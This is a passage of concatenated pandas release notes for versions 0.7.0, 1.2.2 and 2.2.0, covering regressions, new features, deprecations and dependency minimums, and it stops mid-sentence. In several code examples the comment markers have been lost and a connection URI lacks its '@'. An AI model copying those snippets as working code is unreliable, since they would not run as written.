(:issue:`497`)\n- Substantially improve performance of multi-GroupBy aggregation when a\n  Python function is passed, reuse ndarray object in Cython (:issue:`496`)\n- Can store objects indexed by tuples and floats in HDFStore (:issue:`492`)\n- Don't print length by default in Series.to_string, add ``length`` option (:issue:`489`)\n- Improve Cython code for multi-groupby to aggregate without having to sort\n  the data (:issue:`93`)\n- Improve MultiIndex reindexing speed by storing tuples in the MultiIndex,\n  test for backwards unpickling compatibility\n- Improve column reindexing performance by using specialized Cython take\n  function\n- Further performance tweaking of Series.__getitem__ for standard use cases\n- Avoid Index dict creation in some cases (i.e. when getting slices, etc.),\n  regression from prior versions\n- Friendlier error message in setup.py if NumPy not installed\n- Use common set of NA-handling operations (sum, mean, etc.) in Panel class\n  also (:issue:`536`)\n- Default name assignment when calling ``reset_index`` on DataFrame with a\n  regular (non-hierarchical) index (:issue:`476`)\n- Use Cythonized groupers when possible in Series/DataFrame stat ops with\n  ``level`` parameter passed (:issue:`545`)\n- Ported skiplist data structure to C to speed up ``rolling_median`` by about\n  5-10x in most typical use cases (:issue:`374`)\n\n\n.. _whatsnew_0.7.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.6.1..v0.7.0\n\n\n.. _whatsnew_122:\n\nWhat's new in 1.2.2 (February 09, 2021)\n---------------------------------------\n\nThese are the changes in pandas 1.2.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_122.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n\n- Fixed regression in :func:`read_excel` that caused it to raise ``AttributeError`` when checking version of older xlrd versions (:issue:`38955`)\n- Fixed regression in :class:`DataFrame` constructor reordering element when construction from datetime ndarray with dtype not ``\"datetime64[ns]\"`` (:issue:`39422`)\n- Fixed regression in :meth:`DataFrame.astype` and :meth:`Series.astype` not casting to bytes dtype (:issue:`39474`)\n- Fixed regression in :meth:`~DataFrame.to_pickle` failing to create bz2/xz compressed pickle files with ``protocol=5`` (:issue:`39002`)\n- Fixed regression in :func:`pandas.testing.assert_series_equal` and :func:`pandas.testing.assert_frame_equal` always raising ``AssertionError`` when comparing extension dtypes (:issue:`39410`)\n- Fixed regression in :meth:`~DataFrame.to_csv` opening ``codecs.StreamWriter`` in binary mode instead of in text mode and ignoring user-provided ``mode`` (:issue:`39247`)\n- Fixed regression in :meth:`Categorical.astype` casting to incorrect dtype when ``np.int32`` is passed to dtype argument (:issue:`39402`)\n- Fixed regression in :meth:`~DataFrame.to_excel` creating corrupt files when appending (``mode=\"a\"``) to an existing file (:issue:`39576`)\n- Fixed regression in :meth:`DataFrame.transform` failing in case of an empty DataFrame or Series (:issue:`39636`)\n- Fixed regression in :meth:`~DataFrame.groupby` or :meth:`~DataFrame.resample` when aggregating an all-NaN or numeric object dtype column (:issue:`39329`)\n- Fixed regression in :meth:`.Rolling.count` where the ``min_periods`` argument would be set to ``0`` after the operation (:issue:`39554`)\n- Fixed regression in :func:`read_excel` that incorrectly raised when the argument ``io`` was a non-path and non-buffer and the ``engine`` argument was specified (:issue:`39528`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_122.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- :func:`pandas.read_excel` error message when a specified ``sheetname`` does not exist is now uniform across engines (:issue:`39250`)\n- Fixed bug in :func:`pandas.read_excel` producing incorrect results when the engine ``openpyxl`` is used and the excel file is missing or has incorrect dimension information; the fix requires ``openpyxl`` >= 3.0.0, prior versions may still fail (:issue:`38956`, :issue:`39001`)\n- Fixed bug in :func:`pandas.read_excel` sometimes producing a ``DataFrame`` with trailing rows of ``np.nan`` when the engine ``openpyxl`` is used (:issue:`39181`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_122.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.1..v1.2.2\n\n\n.. _whatsnew_220:\n\nWhat's new in 2.2.0 (January 19, 2024)\n--------------------------------------\n\nThese are the changes in pandas 2.2.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_220.upcoming_changes:\n\nUpcoming changes in pandas 3.0\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\npandas 3.0 will bring two bigger changes to the default behavior of pandas.\n\nCopy-on-Write\n^^^^^^^^^^^^^\n\nThe currently optional mode Copy-on-Write will be enabled by default in pandas 3.0. There\nwon't be an option to keep the current behavior enabled. The new behavioral semantics are\nexplained in the :ref:`user guide about Copy-on-Write <copy_on_write>`.\n\nThe new behavior can be enabled since pandas 2.0 with the following option:\n\n.. code-block:: ipython\n\n   pd.options.mode.copy_on_write = True\n\nThis change brings different changes in behavior in how pandas operates with respect to\ncopies and views. Some of these changes allow a clear deprecation, like the changes in\nchained assignment. Other changes are more subtle and thus, the warnings are hidden behind\nan option that can be enabled in pandas 2.2.\n\n.. code-block:: ipython\n\n   pd.options.mode.copy_on_write = \"warn\"\n\nThis mode will warn in many different scenarios that aren't actually relevant to\nmost queries. We recommend exploring this mode, but it is not necessary to get rid\nof all of these warnings. The :ref:`migration guide <copy_on_write.migration_guide>`\nexplains the upgrade process in more detail.\n\nDedicated string data type (backed by Arrow) by default\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nHistorically, pandas represented string columns with NumPy object data type. This\nrepresentation has numerous problems, including slow performance and a large memory\nfootprint. This will change in pandas 3.0. pandas will start inferring string columns\nas a new ``string`` data type, backed by Arrow, which represents strings contiguous in memory. This brings\na huge performance and memory improvement.\n\nOld behavior:\n\n.. code-block:: ipython\n\n    In [1]: ser = pd.Series([\"a\", \"b\"])\n    Out[1]:\n    0    a\n    1    b\n    dtype: object\n\nNew behavior:\n\n\n.. code-block:: ipython\n\n    In [1]: ser = pd.Series([\"a\", \"b\"])\n    Out[1]:\n    0    a\n    1    b\n    dtype: string\n\nThe string data type that is used in these scenarios will mostly behave as NumPy\nobject would, including missing value semantics and general operations on these\ncolumns.\n\nThis change includes a few additional changes across the API:\n\n- Currently, specifying ``dtype=\"string\"`` creates a dtype that is backed by Python strings\n  which are stored in a NumPy array. This will change in pandas 3.0, this dtype\n  will create an Arrow backed string column.\n- The column names and the Index will also be backed by Arrow strings.\n- PyArrow will become a required dependency with pandas 3.0 to accommodate this change.\n\nThis future dtype inference logic can be enabled with:\n\n.. code-block:: ipython\n\n   pd.options.future.infer_string = True\n\n.. _whatsnew_220.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_220.enhancements.adbc_support:\n\nADBC Driver support in to_sql and read_sql\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`read_sql` and :meth:`~DataFrame.to_sql` now work with `Apache Arrow ADBC\n<https://arrow.apache.org/adbc/current/index.html>`_ drivers. Compared to\ntraditional drivers used via SQLAlchemy, ADBC drivers should provide\nsignificant performance improvements, better type support and cleaner\nnullability handling.\n\n.. code-block:: ipython\n\n   import adbc_driver_postgresql.dbapi as pg_dbapi\n\n   df = pd.DataFrame(\n       [\n           [1, 2, 3],\n           [4, 5, 6],\n       ],\n       columns=['a', 'b', 'c']\n   )\n   uri = \"postgresql://postgres:postgreslocalhost/postgres\"\n   with pg_dbapi.connect(uri) as conn:\n       df.to_sql(\"pandas_table\", conn, index=False)\n\n    for round-tripping\n   with pg_dbapi.connect(uri) as conn:\n       df2 = pd.read_sql(\"pandas_table\", conn)\n\nThe Arrow type system offers a wider array of types that can more closely match\nwhat databases like PostgreSQL can offer. To illustrate, note this (non-exhaustive)\nlisting of types available in different databases and pandas backends:\n\n+-----------------+-----------------------+----------------+---------+\n|numpy/pandas     |arrow                  |postgres        |sqlite   |\n+=================+=======================+================+=========+\n|int16/Int16      |int16                  |SMALLINT        |INTEGER  |\n+-----------------+-----------------------+----------------+---------+\n|int32/Int32      |int32                  |INTEGER         |INTEGER  |\n+-----------------+-----------------------+----------------+---------+\n|int64/Int64      |int64                  |BIGINT          |INTEGER  |\n+-----------------+-----------------------+----------------+---------+\n|float32          |float32                |REAL            |REAL     |\n+-----------------+-----------------------+----------------+---------+\n|float64          |float64                |DOUBLE PRECISION|REAL     |\n+-----------------+-----------------------+----------------+---------+\n|object           |string                 |TEXT            |TEXT     |\n+-----------------+-----------------------+----------------+---------+\n|bool             |``bool_``              |BOOLEAN         |         |\n+-----------------+-----------------------+----------------+---------+\n|datetime64[ns]   |timestamp(us)          |TIMESTAMP       |         |\n+-----------------+-----------------------+----------------+---------+\n|datetime64[ns,tz]|timestamp(us,tz)       |TIMESTAMPTZ     |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |date32                 |DATE            |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |month_day_nano_interval|INTERVAL        |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |binary                 |BINARY          |BLOB     |\n+-----------------+-----------------------+----------------+---------+\n|                 |decimal128             |DECIMAL [f1]_  |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |list                   |ARRAY [f1]_    |         |\n+-----------------+-----------------------+----------------+---------+\n|                 |struct                 |COMPOSITE TYPE  |         |\n|                 |                       | [f1]_         |         |\n+-----------------+-----------------------+----------------+---------+\n\n.. rubric:: Footnotes\n\n.. [f1] Not implemented as of writing, but theoretically possible\n\nIf you are interested in preserving database types as best as possible\nthroughout the lifecycle of your DataFrame, users are encouraged to\nleverage the ``dtype_backend=\"pyarrow\"`` argument of :func:`~pandas.read_sql`\n\n.. code-block:: ipython\n\n    for round-tripping\n   with pg_dbapi.connect(uri) as conn:\n       df2 = pd.read_sql(\"pandas_table\", conn, dtype_backend=\"pyarrow\")\n\nThis will prevent your data from being converted to the traditional pandas/NumPy\ntype system, which often converts SQL types in ways that make them impossible to\nround-trip.\n\nFor a full list of ADBC drivers and their development status, see the `ADBC Driver\nImplementation Status <https://arrow.apache.org/adbc/current/driver/status.html>`_\ndocumentation.\n\n.. _whatsnew_220.enhancements.case_when:\n\nCreate a pandas Series based on one or more conditions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :meth:`Series.case_when` function has been added to create a Series object based on one or more conditions. (:issue:`39154`)\n\n.. ipython:: python\n\n   import pandas as pd\n\n   df = pd.DataFrame(dict(a=[1, 2, 3], b=[4, 5, 6]))\n   default=pd.Series('default', index=df.index)\n   default.case_when(\n        caselist=[\n            (df.a == 1, 'first'),                               condition, replacement\n            (df.a.gt(1) & df.b.eq(5), 'second'),   condition, replacement\n        ],\n   )\n\n.. _whatsnew_220.enhancements.to_numpy_ea:\n\n``to_numpy`` for NumPy nullable and Arrow types converts to suitable NumPy dtype\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``to_numpy`` for NumPy nullable and Arrow types will now convert to a\nsuitable NumPy dtype instead of ``object`` dtype for nullable and PyArrow backed extension dtypes.\n\n*Old behavior:*\n\n.. code-block:: ipython\n\n    In [1]: ser = pd.Series([1, 2, 3], dtype=\"Int64\")\n    In [2]: ser.to_numpy()\n    Out[2]: array([1, 2, 3], dtype=object)\n\n*New behavior:*\n\n.. ipython:: python\n\n    ser = pd.Series([1, 2, 3], dtype=\"Int64\")\n    ser.to_numpy()\n\n    ser = pd.Series([1, 2, 3], dtype=\"timestamp[ns][pyarrow]\")\n    ser.to_numpy()\n\nThe default NumPy dtype (without any arguments) is determined as follows:\n\n- float dtypes are cast to NumPy floats\n- integer dtypes without missing values are cast to NumPy integer dtypes\n- integer dtypes with missing values are cast to NumPy float dtypes and ``NaN`` is used as missing value indicator\n- boolean dtypes without missing values are cast to NumPy bool dtype\n- boolean dtypes with missing values keep object dtype\n- datetime and timedelta types are cast to Numpy datetime64 and timedelta64 types respectively and ``NaT`` is used as missing value indicator\n\n.. _whatsnew_220.enhancements.struct_accessor:\n\nSeries.struct accessor for PyArrow structured data\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``Series.struct`` accessor provides attributes and methods for processing\ndata with ``struct[pyarrow]`` dtype Series. For example,\n:meth:`Series.struct.explode` converts PyArrow structured data to a pandas\nDataFrame. (:issue:`54938`)\n\n.. ipython:: python\n\n    import pyarrow as pa\n    series = pd.Series(\n        [\n            {\"project\": \"pandas\", \"version\": \"2.2.0\"},\n            {\"project\": \"numpy\", \"version\": \"1.25.2\"},\n            {\"project\": \"pyarrow\", \"version\": \"13.0.0\"},\n        ],\n        dtype=pd.ArrowDtype(\n            pa.struct([\n                (\"project\", pa.string()),\n                (\"version\", pa.string()),\n            ])\n        ),\n    )\n    series.struct.explode()\n\nUse :meth:`Series.struct.field` to index into a (possible nested)\nstruct field.\n\n\n.. ipython:: python\n\n    series.struct.field(\"project\")\n\n.. _whatsnew_220.enhancements.list_accessor:\n\nSeries.list accessor for PyArrow list data\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``Series.list`` accessor provides attributes and methods for processing\ndata with ``list[pyarrow]`` dtype Series. For example,\n:meth:`Series.list.__getitem__` allows indexing pyarrow lists in\na Series. (:issue:`55323`)\n\n.. ipython:: python\n\n    import pyarrow as pa\n    series = pd.Series(\n        [\n            [1, 2, 3],\n            [4, 5],\n            [6],\n        ],\n        dtype=pd.ArrowDtype(\n            pa.list_(pa.int64())\n        ),\n    )\n    series.list[0]\n\n.. _whatsnew_220.enhancements.calamine:\n\nCalamine engine for :func:`read_excel`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``calamine`` engine was added to :func:`read_excel`.\nIt uses ``python-calamine``, which provides Python bindings for the Rust library `calamine <https://crates.io/crates/calamine>`__.\nThis engine supports Excel files (``.xlsx``, ``.xlsm``, ``.xls``, ``.xlsb``) and OpenDocument spreadsheets (``.ods``) (:issue:`50395`).\n\nThere are two advantages of this engine:\n\n1. Calamine is often faster than other engines, some benchmarks show results up to 5x faster than 'openpyxl', 20x - 'odf', 4x - 'pyxlsb', and 1.5x - 'xlrd'.\n   But, 'openpyxl' and 'pyxlsb' are faster in reading a few rows from large files because of lazy iteration over rows.\n2. Calamine supports the recognition of datetime in ``.xlsb`` files, unlike 'pyxlsb' which is the only other engine in pandas that can read ``.xlsb`` files.\n\n.. code-block:: python\n\n   pd.read_excel(\"path_to_file.xlsb\", engine=\"calamine\")\n\n\nFor more, see :ref:`io.calamine` in the user guide on IO tools.\n\n.. _whatsnew_220.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- :meth:`~DataFrame.to_sql` with method parameter set to ``multi`` works with Oracle on the backend\n- :attr:`Series.attrs` / :attr:`DataFrame.attrs` now uses a deepcopy for propagating ``attrs`` (:issue:`54134`).\n- :func:`get_dummies` now returning  extension dtypes ``boolean`` or ``bool[pyarrow]`` that are compatible with the input dtype (:issue:`56273`)\n- :func:`read_csv` now supports ``on_bad_lines`` parameter with ``engine=\"pyarrow\"`` (:issue:`54480`)\n- :func:`read_sas` returns ``datetime64`` dtypes with resolutions better matching those stored natively in SAS, and avoids returning object-dtype in cases that cannot be stored with ``datetime64[ns]`` dtype (:issue:`56127`)\n- :func:`read_spss` now returns a :class:`DataFrame` that stores the metadata in :attr:`DataFrame.attrs` (:issue:`54264`)\n- :func:`tseries.api.guess_datetime_format` is now part of the public API (:issue:`54727`)\n- :meth:`DataFrame.apply` now allows the usage of numba (via ``engine=\"numba\"``) to JIT compile the passed function, allowing for potential speedups (:issue:`54666`)\n- :meth:`ExtensionArray._explode` interface method added to allow extension type implementations of the ``explode`` method (:issue:`54833`)\n- :meth:`ExtensionArray.duplicated` added to allow extension type implementations of the ``duplicated`` method (:issue:`55255`)\n- :meth:`Series.ffill`, :meth:`Series.bfill`, :meth:`DataFrame.ffill`, and :meth:`DataFrame.bfill` have gained the argument ``limit_area``; 3rd party :class:`.ExtensionArray` authors need to add this argument to the method ``_pad_or_backfill`` (:issue:`56492`)\n- Allow passing ``read_only``, ``data_only`` and ``keep_links`` arguments to openpyxl using ``engine_kwargs`` of :func:`read_excel` (:issue:`55027`)\n- Implement :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` for :class:`ArrowDtype` and masked dtypes (:issue:`56267`)\n- Implement masked algorithms for :meth:`Series.value_counts` (:issue:`54984`)\n- Implemented :meth:`Series.dt` methods and attributes for :class:`ArrowDtype` with ``pyarrow.duration`` type (:issue:`52284`)\n- Implemented :meth:`Series.str.extract` for :class:`ArrowDtype` (:issue:`56268`)\n- Improved error message that appears in :meth:`DatetimeIndex.to_period` with frequencies which are not supported as period frequencies, such as ``\"BMS\"`` (:issue:`56243`)\n- Improved error message when constructing :class:`Period` with invalid offsets such as ``\"QS\"`` (:issue:`55785`)\n- The dtypes ``string[pyarrow]`` and ``string[pyarrow_numpy]`` now both utilize the ``large_string`` type from PyArrow to avoid overflow for long columns (:issue:`56259`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n.. _whatsnew_220.notable_bug_fixes.merge_sort_behavior:\n\n:func:`merge` and :meth:`DataFrame.join` now consistently follow documented sort behavior\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, :func:`merge` and :meth:`DataFrame.join` did not\nalways return a result that followed the documented sort behavior. pandas now\nfollows the documented sort behavior in merge and join operations (:issue:`54611`, :issue:`56426`, :issue:`56443`).\n\nAs documented, ``sort=True`` sorts the join keys lexicographically in the resulting\n:class:`DataFrame`. With ``sort=False``, the order of the join keys depends on the\njoin type (``how`` keyword):\n\n- ``how=\"left\"``: preserve the order of the left keys\n- ``how=\"right\"``: preserve the order of the right keys\n- ``how=\"inner\"``: preserve the order of the left keys\n- ``how=\"outer\"``: sort keys lexicographically\n\nOne example with changing behavior is inner joins with non-unique left join keys\nand ``sort=False``:\n\n.. ipython:: python\n\n    left = pd.DataFrame({\"a\": [1, 2, 1]})\n    right = pd.DataFrame({\"a\": [1, 2]})\n    result = pd.merge(left, right, how=\"inner\", on=\"a\", sort=False)\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [5]: result\n    Out[5]:\n       a\n    0  1\n    1  1\n    2  2\n\n*New Behavior*\n\n.. ipython:: python\n\n    result\n\n.. _whatsnew_220.notable_bug_fixes.multiindex_join_different_levels:\n\n:func:`merge` and :meth:`DataFrame.join` no longer reorder levels when levels differ\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, :func:`merge` and :meth:`DataFrame.join` would reorder\nindex levels when joining on two indexes with different levels (:issue:`34133`).\n\n.. ipython:: python\n\n    left = pd.DataFrame({\"left\": 1}, index=pd.MultiIndex.from_tuples([(\"x\", 1), (\"x\", 2)], names=[\"A\", \"B\"]))\n    right = pd.DataFrame({\"right\": 2}, index=pd.MultiIndex.from_tuples([(1, 1), (2, 2)], names=[\"B\", \"C\"]))\n    left\n    right\n    result = left.join(right)\n\n*Old Behavior*\n\n.. code-block:: ipython\n\n    In [5]: result\n    Out[5]:\n           left  right\n    B A C\n    1 x 1     1      2\n    2 x 2     1      2\n\n*New Behavior*\n\n.. ipython:: python\n\n    result\n\n.. _whatsnew_220.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nFor `optional dependencies <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nOptional dependencies below the lowest tested version may still work but are not considered supported.\nThe following table lists the optional dependencies that have had their minimum tested version increased.\n\n+-----------------+---------------------+\n| Package         | New Minimum Version |\n+=================+=====================+\n| beautifulsoup4  | 4.11.2              |\n+-----------------+---------------------+\n| blosc           | 1.21.3              |\n+-----------------+---------------------+\n| bottleneck      | 1.3.6               |\n+-----------------+---------------------+\n| fastparquet     | 2022.12.0           |\n+-----------------+---------------------+\n| fsspec          | 2022.11.0           |\n+-----------------+---------------------+\n| gcsfs           | 2022.11.0           |\n+-----------------+---------------------+\n| lxml            | 4.9.2               |\n+-----------------+---------------------+\n| matplotlib      | 3.6.3               |\n+-----------------+---------------------+\n| numba           | 0.56.4              |\n+-----------------+---------------------+\n| numexpr         | 2.8.4               |\n+-----------------+---------------------+\n| qtpy            | 2.3.0               |\n+-----------------+---------------------+\n| openpyxl        | 3.1.0               |\n+-----------------+---------------------+\n| psycopg2        | 2.9.6               |\n+-----------------+---------------------+\n| pyreadstat      | 1.2.0               |\n+-----------------+---------------------+\n| pytables        | 3.8.0               |\n+-----------------+---------------------+\n| pyxlsb          | 1.0.10              |\n+-----------------+---------------------+\n| s3fs            | 2022.11.0           |\n+-----------------+---------------------+\n| scipy           | 1.10.0              |\n+-----------------+---------------------+\n| sqlalchemy      | 2.0.0               |\n+-----------------+---------------------+\n| tabulate        | 0.9.0               |\n+-----------------+---------------------+\n| xarray          | 2022.12.0           |\n+-----------------+---------------------+\n| xlsxwriter      | 3.0.5               |\n+-----------------+---------------------+\n| zstandard       | 0.19.0              |\n+-----------------+---------------------+\n| pyqt5           | 5.15.8              |\n+-----------------+---------------------+\n| tzdata          | 2022.7              |\n+-----------------+---------------------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_220.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n- The hash values of nullable extension dtypes changed to improve the performance of the hashing operation (:issue:`56507`)\n- ``check_exact`` now only takes effect for floating-point dtypes in :func:`testing.assert_frame_equal` and :func:`testing.assert_series_equal`. In particular, integer dtypes are always checked exactly (:issue:`55882`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\nChained assignment\n^^^^^^^^^^^^^^^^^^\n\nIn preparation of larger upcoming changes to the copy / view behaviour in pandas 3.0\n(:ref:`copy_on_write`, PDEP-7), we started deprecating *chained assignment*.\n\nChained assignment occurs when you try to update a pandas DataFrame or Series through\ntwo subsequent indexing operations. Depending on the type and order of those operations\nthis currently does or does not work.\n\nA typical example is as follows:\n\n.. code-block:: python\n\n    df = pd.DataFrame({\"foo\": [1, 2, 3], \"bar\": [4, 5, 6]})\n\n     first selecting rows with a mask, then assigning values to a column\n     -> this has never worked and raises a SettingWithCopyWarning\n    df[df[\"bar\"] > 5][\"foo\"] = 100\n\n     first selecting the column, and then assigning to a subset of that column\n     -> this currently works\n    df[\"foo\"][df[\"bar\"] > 5] = 100\n\nThis second example of chained assignment currently works to update the original ``df``.\nThis will no longer work in pandas 3.0, and therefore we started deprecating this:\n\n.. code-block:: python\n\n    >>> df[\"foo\"][df[\"bar\"] > 5] = 100\n    FutureWarning: ChainedAssignmentError: behaviour will change in pandas 3.0!\n    You are setting values through chained assignment. Currently this works in certain cases, but when using Copy-on-Write (which will become the default behaviour in pandas 3.0) this will never work to update the original DataFrame or Series, because the intermediate object on which we are setting values will behave as a copy.\n    A typical example is when you are setting values in a column of a DataFrame, like:\n\n    df[\"col\"][row_indexer] = value\n\n    Use `df.loc[row_indexer, \"col\"] = values` instead, to perform the assignment in a single step and ensure this keeps updating the original `df`.\n\n    See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n\nYou can fix this warning and ensure your code is ready for pandas 3.0 by removing\nthe usage of chained assignment. Typically, this can be done by doing the assignment\nin a single step using for example ``.loc``. For the example above, we can do:\n\n.. code-block:: python\n\n    df.loc[df[\"bar\"] > 5, \"foo\"] = 100\n\nThe same deprecation applies to inplace methods that are done in a chained manner, such as:\n\n.. code-block:: python\n\n    >>> df[\"foo\"].fillna(0, inplace=True)\n    FutureWarning: A value is trying to be set on a copy of a DataFrame or Series through chained assignment using an inplace method.\n    The behavior will change in pandas 3.0. This inplace method will never work because the intermediate object on which we are setting values always behaves as a copy.\n\n    For example, when doing 'df[col].method(value, inplace=True)', try using 'df.method({col: value}, inplace=True)' or df[col] = df[col].method(value) instead, to perform the operation inplace on the original object.\n\nWhen the goal is to update the column in the DataFrame ``df``, the alternative here is\nto call the method on ``df`` itself, such as ``df.fillna({\"foo\": 0}, inplace=True)``.\n\nSee more details in the :ref:`migration guide <copy_on_write.migration_guide>`.\n\n\nDeprecate aliases ``M``, ``Q``, ``Y``, etc. in favour of ``ME``, ``QE``, ``YE``, etc. for offsets\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nDeprecated the following frequency aliases (:issue:`9586`):\n\n+-------------------------------+------------------+------------------+\n|offsets                        |deprecated aliases|new aliases       |\n+===============================+==================+==================+\n|:class:`MonthEnd`              |      ``M``       |     ``ME``       |\n+-------------------------------+------------------+------------------+\n|:class:`BusinessMonthEnd`      |      ``BM``      |     ``BME``      |\n+-------------------------------+------------------+------------------+\n|:class:`SemiMonthEnd`          |      ``SM``      |     ``SME``      |\n+-------------------------------+------------------+------------------+\n|:class:`CustomBusinessMonthEnd`|      ``CBM``     |     ``CBME``     |\n+-------------------------------+------------------+------------------+\n|:class:`QuarterEnd`            |      ``Q``       |     ``QE``       |\n+-------------------------------+------------------+------------------+\n|:class:`BQuarterEnd`           |      ``BQ``      |     ``BQE``      |\n+-------------------------------+------------------+------------------+\n|:class:`YearEnd`               |      ``Y``       |     ``YE``       |\n+-------------------------------+------------------+------------------+\n|:class:`BYearEnd`              |      ``BY``      |     ``BYE``      |\n+-------------------------------+------------------+------------------+\n\nFor example:\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [8]: pd.date_range('2020-01-01', periods=3, freq='Q-NOV')\n    Out[8]:\n    DatetimeIndex(['2020-02-29', '2020-05-31', '2020-08-31'],\n                  dtype='datetime64[ns]', freq='Q-NOV')\n\n*Future behavior*:\n\n.. ipython:: python\n\n    pd.date_range('2020-01-01', periods=3, freq='QE-NOV')\n\nDeprecated automatic downcasting\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nDeprecated the automatic downcasting of object dtype results in a number of\nmethods. These would silently change the dtype in a hard to predict manner since the\nbehavior was value dependent. Additionally, pandas is moving away from silent dtype\nchanges (:issue:`54710`, :issue:`54261`).\n\nThese methods are:\n\n- :meth:`Series.replace` and :meth:`DataFrame.replace`\n- :meth:`DataFrame.fillna`, :meth:`Series.fillna`\n- :meth:`DataFrame.ffill`, :meth:`Series.ffill`\n- :meth:`DataFrame.bfill`, :meth:`Series.bfill`\n- :meth:`DataFrame.mask`, :meth:`Series.mask`\n- :meth:`DataFrame.where`, :meth:`Series.where`\n- :meth:`DataFrame.clip`, :meth:`Series.clip`\n\nExplicitly call :meth:`DataFrame.infer_objects` to replicate the current behavior in the future.\n\n.. code-block:: ipython\n\n    result = result.infer_objects(copy=False)\n\nOr explicitly cast all-round floats to ints using ``astype``.\n\nSet the following option to opt into the future behavior:\n\n.. code-block:: ipython\n\n    In [9]: pd.set_option(\"future.no_silent_downcasting\", True)\n\nOther Deprecations\n^^^^^^^^^^^^^^^^^^\n- Changed :meth:`Timedelta.resolution_string` to return ``h``, ``min``, ``s``, ``ms``, ``us``, and ``ns`` instead of ``H``, ``T``, ``S``, ``L``, ``U``, and ``N``, for compatibility with respective deprecations in frequency aliases (:issue:`52536`)\n- Deprecated :attr:`offsets.Day.delta`, :attr:`offsets.Hour.delta`, :attr:`offsets.Minute.delta`, :attr:`offsets.Second.delta`, :attr:`offsets.Milli.delta`, :attr:`offsets.Micro.delta`, :attr:`offsets.Nano.delta`, use ``pd.Timedelta(obj)`` instead (:issue:`55498`)\n- Deprecated :func:`pandas.api.types.is_interval` and :func:`pandas.api.types.is_period`, use ``isinstance(obj, pd.Interval)`` and ``isinstance(obj, pd.Period)`` instead (:issue:`55264`)\n- Deprecated :func:`read_gbq` and :meth:`DataFrame.to_gbq`. Use ``pandas_gbq.read_gbq`` and ``pandas_gbq.to_gbq`` instead https://pandas-gbq.readthedocs.io/en/latest/api.html (:issue:`55525`)\n- Deprecated :meth:`.DataFrameGroupBy.fillna` and :meth:`.SeriesGroupBy.fillna`; use :meth:`.DataFrameGroupBy.ffill`, :meth:`.DataFrameGroupBy.bfill` for forward and backward filling or :meth:`.DataFrame.fillna` to fill with a single value (or the Series equivalents) (:issue:`55718`)\n- Deprecated :meth:`DateOffset.is_anchored`, use ``obj.n == 1`` for non-Tick subclasses (for Tick this was always False) (:issue:`55388`)\n- Deprecated :meth:`DatetimeArray.__init__` and :meth:`TimedeltaArray.__init__`, use :func:`array` instead (:issue:`55623`)\n- Deprecated :meth:`Index.format`, use ``index.astype(str)`` or ``index.map(formatter)`` instead (:issue:`55413`)\n- Deprecated :meth:`Series.ravel`, the underlying array is already 1D, so ravel is not necessary (:issue:`52511`)\n- Deprecated :meth:`Series.resample` and :meth:`DataFrame.resample` with a :class:`PeriodIndex` (and the 'convention' keyword), convert to :class:`DatetimeIndex` (with ``.to_timestamp()``) before resampling instead (:issue:`53481`)\n- Deprecated :meth:`Series.view`, use :meth:`Series.astype` instead to change the dtype (:issue:`20251`)\n- Deprecated :meth:`offsets.Tick.is_anchored`, use 